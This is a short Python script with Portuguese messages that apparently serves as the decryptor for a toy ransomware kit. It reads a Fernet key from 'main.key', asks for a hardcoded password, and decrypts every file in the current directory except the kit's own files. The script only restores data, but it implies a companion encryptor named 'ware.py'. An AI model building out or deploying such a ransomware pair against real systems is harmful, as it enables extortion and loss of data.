import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
        if file in ["ware.py" , "main.key" , "noware.py"]:
                continue
        if os.path.isfile(file):
                files.append(file)

print(f"Ficheiros Criptografados: {files}")

with open("main.key", "rb") as key:
        onion = key.read()

passwd = "sua-senha-aqui"
upasswd = input("Insira a senha correta: ")

if passwd == upasswd:
        for file in files:
                with open(file, "rb") as tfile:
                        content = tfile.read()

                content_decrypt = Fernet(onion).decrypt(content)
                with open(file, "wb") as tfile:
                        tfile.write(content_decrypt)

                print(f"Você descriptografou todos os ficheiros!!!")
else:
        print("Senha Inválida!!")
